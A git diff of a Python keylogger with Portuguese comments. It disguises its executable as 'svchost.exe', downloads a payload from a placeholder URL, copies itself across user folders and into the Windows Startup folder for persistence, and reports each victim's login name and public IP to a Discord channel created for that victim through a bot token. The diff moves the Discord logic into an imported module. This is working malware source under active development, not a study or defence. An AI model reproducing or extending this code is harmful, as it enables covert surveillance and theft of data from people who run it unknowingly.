@@ -3,6 +3,7 @@ import sys
 import shutil
 import requests
 from dotenv import load_dotenv
+from funcoes import criar_canal, send, kill
 
 load_dotenv()
 
@@ -12,46 +13,19 @@ token_dc = os.getenv('token_dc')
 
 FAKE_NAME = "svchost.exe"  # nome do executável falso
 
-# Diretorios onde o KeyLogger vão se espalhar
+# Diretorios onde o KeyLogger vai se espalhar
 DIRS = [
-    os.path.join(os.getenv('APPDATA'), r"Microsoft\Windows\svchost"),
     os.path.join(os.getenv('LOCALAPPDATA'), r"Temp\WinUpdate"),
-    os.path.join(os.getenv('PROGRAMDATA'), r"SystemService"),
 ]
 
-# Função para enviar notificações
-def send(mensagem):
-    payload = {
-        'content': mensagem
-    }
-    response = requests.post(url, json=payload)
-    return response
-
-# Identificação do usuario
-ip_publico = requests.get('https://httpbin.org/ip').json()['origin']
-usuario = os.getlogin()
-
-criar_canal = {
-    "name": f'{usuario} - {ip_publico}',
-    "type": 0,
-
-}
-
-headers = {
-    "Authorization": f"Bot {token_dc}",
-    "Content-Type": "application/json"
-}
-
-# Cria Novo Canal no Discord para cada usuario
-response = requests.post(f'https://discord.com/api/guilds/{guild_id}/channels', json=criar_canal, headers=headers)
-
-if response.status_code == 201:
-    send(f'Canal {response.json()['name']} criado com sucesso!')
-else:
-    send(f"Erro ao criar canal: {response.status_code} - {response.json()}")
+startup = os.path.join(os.getenv('APPDATA'), r"Microsoft\Windows\Start Menu\Programs\Startup")
+inicializar = os.path.join(startup, FAKE_NAME)
 
 
-# Altera nome do arquivo .exe
+
+# Função de criar Canal
+criar_canal()
+
 resposta = requests.get('COLOCAR URL DO EXECUTAVEL')
 if resposta.status_code == 200:
     with open(FAKE_NAME, 'wb' ) as f:
@@ -69,6 +43,7 @@ def replicar_executavel():
             destino = os.path.join(pasta, FAKE_NAME)
             if not os.path.exists(destino):
                 shutil.copy2(exe_path, destino)  # copia o executável para a pasta
+                shutil.copy2(exe_path, inicializar) # Copia o executavel para o Startup do Windows 
                 send(f'Arquivo clonado em {destino}')
             else:
                 print(f"Executável já existe em {destino}")
